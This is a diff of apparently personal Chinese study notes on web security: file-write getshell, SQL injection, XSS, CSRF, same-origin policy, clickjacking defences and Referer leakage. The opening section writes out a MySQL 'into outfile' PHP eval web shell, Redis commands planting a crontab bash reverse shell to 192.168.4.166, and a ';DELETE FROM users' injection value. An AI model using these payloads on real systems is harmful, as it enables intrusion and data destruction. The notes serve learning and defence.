@@ -1,26 +1,104 @@
-getshell
+文件注入
+将代码写入文件实现getshell 
+    文件放在web程序的对应目录，web程序有可能热加载执行该文件 如php python
+    写入contab的配置文件，crontab动态加载
 
-#mysql安全
-通过
+#mysql
 1. 开启general log，使用sql拼接
 2. select ... from ... into outfile
    Select '<?php eval($_POST[cmd]);?>' into outfile 'F:/wwwroot/eval.php';
-将代码写入文件
-文件放在web程序的对应目录，web程序有可能执行该文件 如php
+
+#redis
+1.修改文件写入crontab配置
+config set dbfilename root            #后面的值对应linux的用户名
+config set dir /var/spool/cron/
+config rewrite 
+2.设置恶意命令 crontab自动运行
+set xxx '\n* * * * * /bin/bash -i >& /dev/tcp/192.168.4.166/4567 0>&1'
+
+
+    
+
+sql注入
+传入变量给后端执行sql时，变量带有逃逸的操作
+    SELECT * FROM users WHERE id='$id'
+    id为               ';DELETE FROM users --
+    则拼接后的语句为   SELECT * FROM users WHERE id='';DELETE FROM users --'
+
+转义处理（顺序不能乱） 
+    \  ->  \\
+    '  ->  \'
+    "  ->  \"
 
 
 
 
-XSS  (Cross Site Scripting) 跨域脚本攻击                 向网站A注入JS代码。
+XSS  (Cross Site Scripting) 跨域脚本攻击                 向网站A注入JS代码。利用输入时的一些字符实现提交html代码，如 < /> 
 
 CSRF (Cross-site request forgery) 跨站请求伪造           访问危险网站B时，B的页面使用A存放在浏览器的cookie访问网站A，即调用A网站的url。
 
 CSRF防御
 获取header的Referer参数，判断发起请求的上一级页面。referer由浏览器设置，JS代码不能设置。
-服务端生成html页面时在其中加入token，提交时将token返回  通过header或者拼接到url
+服务端生成html页面时在其中加入token，提交时将token返回，通过header或者post（使用iframe接收返回页面依旧可以进行攻击，如将iframe页面覆盖一层虚假页面诱导用户进行提交，可以设置返回页面禁止用于iframe防御），拼接到url存在referer泄露风险
+
 
 
 相同域
-协议 主机 端口 都需要相同
+协议 主机（域名） 端口 都需要相同
+
+
+同源策略
+js        只能访问相同源的信息
+cookie    区分域，而不区分端口与协议，满足的请求都带有cookie
+
+
+跨域访问
+js                            后端设置Access-Control-Allow-Origin后，js可以在不同源发起请求。
+iframe/iframe 元素     A网站的页面可以加载B网站的页面，加载的页面可能包含恶意操作。iframe内外层不同源时，外层不能通过js访问内层iframe，但内层的iframe可以通过js访问外层（存储于浏览器的信息以及页面内容）。
+img 元素 src 属性             
+script 元素 src 属性          A网站的页面加载B的js，则B的js读取到A存储于浏览器的信息
+CSS <link>元素/@import操作    可能存在风险CSSXSS
+form 元素的 action 属性       恶意利用 form 元素的特性来实施攻击的方式被称为跨站请求伪造（CSRF）
+
+
+
+点击劫持   通过iframe引入并伪装成特定页面
+
+防御策略
+    X-FRAME-OPTIONS 三个选项：
+        DENY 表示任何网页都不能使用 iframe 载入该网页
+        SAMEORIGIN 表示符合同源策略的网页可以使用 iframe载入该网页。
+        Allow-From（白名单限制）
+    
+    通过js判断以阻止其他页面载入 self.location != top.location
+
+
+
+
+
+GET 接口风险
+URL 中指定的参数经由 Referer 泄漏（浏览器访问下一url时把上一url当成referer，且包含url的参数，如果访问第三方url会导致这些参数值泄露，所以敏感请求不要使用GET方法，比如账号登陆，使用iframe时内层不会给外层发referer）
+URL 中指定的参数残留在访问日志（Access Log）中
+
+
+
+
+CGI风险
+由print获取tcp协议传输的信息，可能因为url存在换行符导致header信息被错误覆盖
+
+
+
+
+
+
+
+fiddler
+http抓包工具
+
+
+
+
+
+
 
 
